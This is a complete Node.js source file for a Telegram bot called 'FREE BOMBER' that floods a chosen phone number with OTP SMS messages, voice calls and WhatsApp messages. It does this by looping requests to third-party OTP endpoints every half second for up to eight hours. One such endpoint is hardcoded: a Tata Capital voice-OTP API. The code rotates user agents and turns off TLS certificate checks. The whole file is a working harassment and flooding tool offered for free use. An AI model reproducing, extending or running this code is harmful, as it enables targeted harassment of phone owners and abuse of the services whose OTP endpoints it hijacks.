const fs = require('fs');
const path = require('path');
require('dotenv').config();
const https = require('https');
const express = require('express');
const axios = require('axios');
const sqlite3 = require('sqlite3').verbose();
const { Telegraf, Markup } = require('telegraf');

const BOT_TOKEN = process.env.BOT_TOKEN ;
const OWNER_ID = Number(process.env.OWNER_ID || "6684734209");
const WELCOME_IMAGE = "https://i.postimg.cc/nczX6L6f/file-000000008f987230882c6568d09ed6e3-640x360.png";
const API_FILE = path.join(__dirname, 'api.json');
const DB_FILE = path.join(__dirname, 'fusion_premium.db');
const PORT = Number(process.env.PORT || 8080);

const DURATION_OPTIONS = {
  "1": 1,
  "5": 5,
  "15": 15,
  "30": 30,
  "60": 60,
  "120": 120,
  "240": 240,
  "480": 480
};

function loadApis() {
  try {
    if (!fs.existsSync(API_FILE)) {
      const defaultApis = [
        {
          name: "Tata Capital Voice Call",
          url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: {
            phone: "{no}",
            isOtpViaCallAtLogin: "true"
          }
        }
      ];
      fs.writeFileSync(API_FILE, JSON.stringify(defaultApis, null, 2));
      return defaultApis;
    }

    const raw = fs.readFileSync(API_FILE, 'utf8');
    const apis = JSON.parse(raw);
    console.log(`Loaded ${apis.length} APIs from api.json`);
    return apis;
  } catch (error) {
    console.warn(`Failed to load api.json: ${error.message}`);
    return [];
  }
}

const APIS = loadApis();

function parseDateTime(value) {
  if (!value) return null;
  const normalized = value.replace(' ', 'T');
  const date = new Date(normalized);
  return Number.isNaN(date.getTime()) ? null : date;
}

function formatExpiry(date) {
  return date.toISOString().replace('T', ' ').substring(0, 19);
}

function formatDurationLabel(duration) {
  if (duration < 60) return `${duration} Minutes`;
  if (duration === 60) return '1 Hour';
  return `${duration / 60} Hours`;
}

class Database {
  constructor() {
    this.db = new sqlite3.Database(DB_FILE, (err) => {
      if (err) {
        console.error('Failed to open database:', err.message);
      }
    });
    this.tempAttackData = {};
    this.tempAdminData = {};
    this.createTables();
  }

  run(sql, params = []) {
    return new Promise((resolve, reject) => {
      this.db.run(sql, params, function (err) {
        if (err) return reject(err);
        resolve(this);
      });
    });
  }

  get(sql, params = []) {
    return new Promise((resolve, reject) => {
      this.db.get(sql, params, (err, row) => {
        if (err) return reject(err);
        resolve(row);
      });
    });
  }

  all(sql, params = []) {
    return new Promise((resolve, reject) => {
      this.db.all(sql, params, (err, rows) => {
        if (err) return reject(err);
        resolve(rows);
      });
    });
  }

  createTables() {
    this.db.serialize(() => {
      this.db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        premium_expiry TEXT,
        protected_number TEXT
      )`);

      this.db.run(`CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY,
        days INTEGER,
        is_used INTEGER DEFAULT 0
      )`);
    });
  }

  async getUser(userId) {
    return this.get('SELECT * FROM users WHERE user_id = ?', [userId]);
  }

  async addUser(userId) {
    await this.run('INSERT OR IGNORE INTO users (user_id) VALUES (?)', [userId]);
  }

  async isPremium(userId) {
    if (userId === OWNER_ID) return true;
    const user = await this.getUser(userId);
    if (user && user.premium_expiry) {
      const expiry = parseDateTime(user.premium_expiry);
      return expiry ? Date.now() < expiry.getTime() : false;
    }
    return false;
  }

  async addPremium(userId, days) {
    let user = await this.getUser(userId);
    let current = new Date();

    if (user && user.premium_expiry) {
      const stored = parseDateTime(user.premium_expiry);
      if (stored && stored > current) {
        current = stored;
      }
    }

    const expiry = new Date(current.getTime() + days * 24 * 60 * 60 * 1000);
    const expiryText = formatExpiry(expiry);

    if (!user) {
      await this.run('INSERT INTO users (user_id, premium_expiry) VALUES (?, ?)', [userId, expiryText]);
    } else {
      await this.run('UPDATE users SET premium_expiry = ? WHERE user_id = ?', [expiryText, userId]);
    }
    return expiryText;
  }

  async protect(userId, number) {
    await this.run('UPDATE users SET protected_number = ? WHERE user_id = ?', [number, userId]);
  }

  async unprotect(userId) {
    await this.run('UPDATE users SET protected_number = NULL WHERE user_id = ?', [userId]);
  }

  async isProtected(number) {
    const row = await this.get('SELECT user_id FROM users WHERE protected_number = ?', [number]);
    return Boolean(row);
  }

  async getAllUsers() {
    const rows = await this.all('SELECT user_id FROM users');
    return rows.map((row) => row.user_id);
  }

  async getStats() {
    const users = await this.get('SELECT COUNT(*) AS count FROM users');
    const codes = await this.get('SELECT COUNT(*) AS count FROM redeem_codes');
    return {
      users: users?.count || 0,
      codes: codes?.count || 0
    };
  }

  setAttackData(userId, phone) {
    this.tempAttackData[userId] = { phone, timestamp: Date.now() };
  }

  getAttackData(userId) {
    const data = this.tempAttackData[userId];
    if (!data) return null;
    if (Date.now() - data.timestamp > 5 * 60 * 1000) {
      delete this.tempAttackData[userId];
      return null;
    }
    return data.phone;
  }

  clearAttackData(userId) {
    delete this.tempAttackData[userId];
  }

  setAdminData(userId, key, value) {
    if (!this.tempAdminData[userId]) this.tempAdminData[userId] = {};
    this.tempAdminData[userId][key] = { value, timestamp: Date.now() };
  }

  getAdminData(userId, key) {
    const data = this.tempAdminData[userId]?.[key];
    if (!data) return null;
    if (Date.now() - data.timestamp > 5 * 60 * 1000) {
      delete this.tempAdminData[userId][key];
      return null;
    }
    return data.value;
  }

  clearAdminData(userId, key) {
    if (this.tempAdminData[userId]) {
      delete this.tempAdminData[userId][key];
    }
  }
}

class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
    this.db = new Database();
    this.userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
      'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
    ];
  }

  async makeRequest(api, phone) {
    try {
      const url = api.url.replace('{no}', phone);
      const headers = { ...(api.headers || {}), 'User-Agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)] };
      const timeout = 5000;
      const axiosConfig = {
        url,
        method: (api.method || 'GET').toUpperCase(),
        headers,
        timeout,
        httpsAgent: new https.Agent({ rejectUnauthorized: false }),
        validateStatus: () => true
      };

      if (axiosConfig.method === 'POST') {
        const body = {};
        if (api.body) {
          Object.entries(api.body).forEach(([key, value]) => {
            body[key] = typeof value === 'string' ? value.replace('{no}', phone) : value;
          });
        }

        if (headers['Content-Type'] && headers['Content-Type'].includes('application/json')) {
          axiosConfig.data = body;
        } else {
          axiosConfig.data = body;
        }
      } else if (axiosConfig.method === 'GET') {
        axiosConfig.params = api.params || api.body || {};
      }

      await axios(axiosConfig);
      return true;
    } catch (error) {
      return false;
    }
  }

  async runAttack(userId, phone, duration, apis) {
    const attack = this.activeAttacks.get(userId);
    if (!attack) return;

    while (attack.running && Date.now() < attack.endTime) {
      const tasks = apis.map((api) => this.makeRequest(api, phone));
      await Promise.allSettled(tasks);
      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    if (this.activeAttacks.has(userId)) {
      this.activeAttacks.delete(userId);
    }
  }

  async startAttack(userId, phone, duration, attackType = 'sms') {
    if (this.activeAttacks.has(userId)) return false;

    const apis = APIS.filter((api) => {
      const name = api.name || '';
      if (attackType === 'call') return /Voice|Call/i.test(name);
      if (attackType === 'whatsapp') return /WhatsApp/i.test(name);
      return !/Voice|Call|WhatsApp/i.test(name);
    });

    if (!apis.length) return false;

    const endTime = Date.now() + duration * 60 * 1000;
    this.activeAttacks.set(userId, { phone, endTime, running: true, type: attackType, apis: apis.length });
    setImmediate(() => this.runAttack(userId, phone, duration, apis));
    return true;
  }

  stopAttack(userId) {
    const attack = this.activeAttacks.get(userId);
    if (!attack) return false;
    attack.running = false;
    this.activeAttacks.delete(userId);
    return true;
  }
}

const manager = new AttackManager();
const bot = new Telegraf(BOT_TOKEN);
const sessions = new Map();

function getSession(userId) {
  if (!sessions.has(userId)) {
    sessions.set(userId, {});
  }
  return sessions.get(userId);
}

function resetSession(userId) {
  sessions.delete(userId);
}

function mainKeyboard(userId) {
  const keyboard = [
    [{ text: '📱 SMS' }, { text: '📞 Call' }],
    [{ text: '💬 WhatsApp' }, { text: '📊 Status' }],
    [{ text: '👤 Account' }, { text: '🛡 Protect' }],
    [{ text: '🔓 Unprotect' }, { text: '❓ Help' }]
  ];
  if (userId === OWNER_ID) keyboard.push([{ text: '👑 Admin Panel' }]);
  return {
    keyboard,
    resize_keyboard: true,
    one_time_keyboard: false,
    selective: true
  };
}

function adminKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📢 Broadcast', callback_data: 'adm_broadcast' },
        { text: '📊 Stats', callback_data: 'adm_stats' }
      ]
    ]
  };
}

function durationKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '1 Min', callback_data: 'dur_1' },
        { text: '5 Min', callback_data: 'dur_5' },
        { text: '15 Min', callback_data: 'dur_15' }
      ],
      [
        { text: '30 Min', callback_data: 'dur_30' },
        { text: '1 Hour', callback_data: 'dur_60' },
        { text: '2 Hours', callback_data: 'dur_120' }
      ],
      [
        { text: '4 Hours', callback_data: 'dur_240' },
        { text: '8 Hours', callback_data: 'dur_480' },
        { text: '❌ Cancel', callback_data: 'cancel_attack' }
      ]
    ]
  };
}

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  await manager.db.addUser(userId);
  await ctx.replyWithPhoto(WELCOME_IMAGE, {
    caption: `👋 *Welcome to FREE BOMBER!*

⚡ *All attacks are available for free.*
🚀 *Custom Attack Duration*
📦 *JSON API Configuration*

✅ *Enjoy full access to all features!*`,
    parse_mode: 'Markdown',
    reply_markup: mainKeyboard(userId)
  });
});

bot.command('cancel', async (ctx) => {
  const userId = ctx.from.id;
  resetSession(userId);
  manager.db.clearAttackData(userId);
  await ctx.reply('❌ Operation cancelled.', { reply_markup: mainKeyboard(userId) });
});

bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const text = (ctx.message.text || '').trim();
  const session = getSession(userId);

  await manager.db.addUser(userId);

  if (text === '📱 SMS' || text === '📞 Call' || text === '💬 WhatsApp') {
    if (manager.activeAttacks.has(userId)) {
      await ctx.reply('⚠️ *You already have an active attack!*\nClick `📊 Status` to check or stop it.', {
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard(userId)
      });
      return;
    }

    session.waitingForNumber = true;
    session.attackType = text === '📞 Call' ? 'call' : text === '💬 WhatsApp' ? 'whatsapp' : 'sms';

    await ctx.reply('📞 *Enter 10-digit Phone Number:*\n\nExample: `9876543210`\n\nType /cancel to cancel', {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard(userId)
    });
    return;
  }

  if (text === '📊 Status') {
    const info = manager.activeAttacks.get(userId);
    if (info) {
      const remaining = Math.max(0, Math.ceil((info.endTime - Date.now()) / 60000));
      const message = `🔥 *ATTACK RUNNING*\n\n🎯 \`${info.phone}\`\n⏰ Duration: ${formatDurationLabel(Math.ceil((info.endTime - Date.now()) / 60000))}\n⏳ Left: ${remaining} Minutes\n📡 Using ${info.apis} APIs (${info.type.toUpperCase()})`;
      await ctx.reply(message, {
        parse_mode: 'Markdown',
        reply_markup: Markup.inlineKeyboard([[Markup.button.callback('🛑 STOP ATTACK', 'stop')]])
      });
    } else {
      await ctx.reply('💤 *No active attacks.*', { parse_mode: 'Markdown', reply_markup: mainKeyboard(userId) });
    }
    return;
  }

  if (text === '👤 Account') {
    const user = await manager.db.getUser(userId);
    const expiry = user?.premium_expiry || 'Not Set';
    const accountMessage = `👤 *Account Information*\n🆔 \`${userId}\`\n✅ Full Free Access\n📅 Expiry: ${expiry}\n📊 APIs Loaded: ${APIS.length}`;
    await ctx.reply(accountMessage, {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard(userId)
    });
    return;
  }

  if (text === '🛡 Protect') {
    session.waitingForProtect = true;
    await ctx.reply('🛡 *Enter 10-digit Number to Protect:*\n\nExample: `9876543210`\n\nType /cancel to cancel', {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard(userId)
    });
    return;
  }

  if (text === '🔓 Unprotect') {
    await manager.db.unprotect(userId);
    await ctx.reply('🔓 *Number unprotected.*', { parse_mode: 'Markdown', reply_markup: mainKeyboard(userId) });
    return;
  }

  if (text === '❓ Help') {
    await ctx.reply(`🆘 *Help & Support*\n\n*Available Features:*\n• 📱 SMS - Send SMS attacks (FREE)\n• 📞 Call - Send voice call attacks (FREE)\n• 💬 WhatsApp - Send WhatsApp messages (FREE)\n• 📊 Status - Check attack status\n• 👤 Account - View account info\n• 🛡 Protect - Protect your number\n• 🔓 Unprotect - Remove protection\n\n*Need help?* Contact: [Admin](tg://user?id=${OWNER_ID})`, {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard(userId)
    });
    return;
  }

  if (text === '👑 Admin Panel') {
    if (userId === OWNER_ID) {
      await ctx.reply('👑 *Admin Panel:*', { parse_mode: 'Markdown', reply_markup: adminKeyboard() });
    } else {
      await ctx.reply('❌ Owner Only.', { reply_markup: mainKeyboard(userId) });
    }
    return;
  }

  if (text === '🔑 Redeem') {
    await ctx.reply('✅ All features are free now. No redeem code required.', { reply_markup: mainKeyboard(userId) });
    return;
  }

  if (session.waitingForNumber && /^\d{10}$/.test(text)) {
    session.waitingForNumber = false;
    manager.db.setAttackData(userId, text);
    await ctx.reply('📞 *Target Number:* `'+text+'`\n\n⏰ *Select Attack Duration:*', {
      parse_mode: 'Markdown',
      reply_markup: durationKeyboard()
    });
    return;
  }

  if (session.waitingForProtect && /^\d{10}$/.test(text)) {
    session.waitingForProtect = false;
    await manager.db.protect(userId, text);
    const protectedMessage = `🛡 *Number Protected:* \`${text}\``;
    await ctx.reply(protectedMessage, { parse_mode: 'Markdown', reply_markup: mainKeyboard(userId) });
    return;
  }

  if (session.waitingForBroadcast && userId === OWNER_ID) {
    session.waitingForBroadcast = false;
    const users = await manager.db.getAllUsers();
    let success = 0;
    let failed = 0;
    for (const uid of users) {
      try {
        await bot.telegram.sendMessage(uid, text);
        success += 1;
      } catch {
        failed += 1;
      }
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
    await ctx.reply(`✅ *Broadcast Complete*\n✅ Success: ${success}\n❌ Failed: ${failed}`, { parse_mode: 'Markdown' });
    return;
  }

  if (!text.startsWith('/')) {
    // Provide helpful guidance based on context
    let helpMessage = '🤔 *Not sure what you want?*\n\n';
    
    if (session.waitingForNumber) {
      helpMessage += '📞 You need to enter a *10-digit phone number*\n\nExample: `9876543210`';
    } else if (session.waitingForProtect) {
      helpMessage += '🛡 Please enter a *10-digit phone number to protect*\n\nExample: `9876543210`';
    } else if (session.waitingForBroadcast) {
      helpMessage += '📢 Enter your *broadcast message* to send to all users';
    } else {
      helpMessage += '*Use the menu buttons below:*\n• 📱 SMS - Send SMS attacks\n• 📞 Call - Send voice calls\n• 💬 WhatsApp - Send WhatsApp messages\n• 📊 Status - Check attack status\n• 👤 Account - View account info\n• 🛡 Protect - Protect your number\n• 🔓 Unprotect - Remove protection\n• ❓ Help - Get support';
    }
    
    await ctx.reply(helpMessage, {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard(userId)
    });
  }
});

bot.action(/dur_(.+)/, async (ctx) => {
  const userId = ctx.from.id;
  const session = getSession(userId);
  const phone = manager.db.getAttackData(userId);
  if (!phone) {
    await ctx.editMessageText('❌ Session expired. Please start again by using the attack button.');
    return;
  }

  const durationKey = ctx.match[1];
  const duration = DURATION_OPTIONS[durationKey];
  if (!duration) {
    await ctx.answerCbQuery('❌ Invalid duration', { show_alert: true });
    return;
  }

  const attackType = session.attackType || 'sms';
  const success = await manager.startAttack(userId, phone, duration, attackType);
  if (!success) {
    await ctx.editMessageText('❌ Failed to start attack. Please try again.');
    manager.db.clearAttackData(userId);
    return;
  }

  const info = manager.activeAttacks.get(userId);
  const startedMessage = `🚀 *Attack Started Successfully!*\n\n🎯 *Target:* \`${phone}\`\n⏰ *Duration:* ${formatDurationLabel(duration)}\n📡 *APIs:* ${info.apis}\n👤 *User:* Free\n\n⚡ *Attack will stop automatically after ${formatDurationLabel(duration)}*`;
  await ctx.editMessageText(startedMessage, { parse_mode: 'Markdown' });
  const runningMessage = `🔥 *ATTACK RUNNING*\n\n🎯 \`${phone}\`\n⏰ Duration: ${formatDurationLabel(duration)}\n📡 Using ${info.apis} APIs (${attackType.toUpperCase()})`;
  await ctx.reply(runningMessage, {
    parse_mode: 'Markdown',
    reply_markup: Markup.inlineKeyboard([[Markup.button.callback('🛑 STOP ATTACK', 'stop')]])
  });

  manager.db.clearAttackData(userId);
  session.attackType = null;
});

bot.action('cancel_attack', async (ctx) => {
  const userId = ctx.from.id;
  manager.db.clearAttackData(userId);
  await ctx.editMessageText('❌ Attack cancelled.');
});

bot.action('stop', async (ctx) => {
  const userId = ctx.from.id;
  const stopped = manager.stopAttack(userId);
  if (stopped) {
    await ctx.editMessageText('🛑 *Attack Stopped Successfully!*', { parse_mode: 'Markdown' });
  } else {
    await ctx.answerCbQuery('❌ No active attack found.', { show_alert: true });
  }
});

bot.action('adm_broadcast', async (ctx) => {
  const userId = ctx.from.id;
  if (userId !== OWNER_ID) {
    await ctx.answerCbQuery('❌ Owner only.', { show_alert: true });
    return;
  }
  const session = getSession(userId);
  session.waitingForBroadcast = true;
  await ctx.reply('📢 *Enter message to broadcast:*\n\nType /cancel to cancel', { parse_mode: 'Markdown' });
});

bot.action('adm_stats', async (ctx) => {
  const userId = ctx.from.id;
  if (userId !== OWNER_ID) {
    await ctx.answerCbQuery('❌ Owner only.', { show_alert: true });
    return;
  }
  const stats = await manager.db.getStats();
  await ctx.answerCbQuery(`👥 Total Users: ${stats.users}\n🔑 Total Codes: ${stats.codes}`, { show_alert: true });
});

const app = express();
app.get('/', (req, res) => res.send('Bot is Alive!'));
app.listen(PORT, () => console.log(`Health server running on port ${PORT}`));

bot.launch().then(() => {
  console.log('🔥 FREE BOMBER Started');
  console.log(`📊 Loaded ${APIS.length} APIs from api.json`);
  console.log(`👑 Owner ID: ${OWNER_ID}`);
  console.log('✅ All attack features are free');
  console.log(`⏰ Duration Options: 1min to 8 hours`);
}).catch((err) => {
  console.error('Failed to launch bot:', err);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
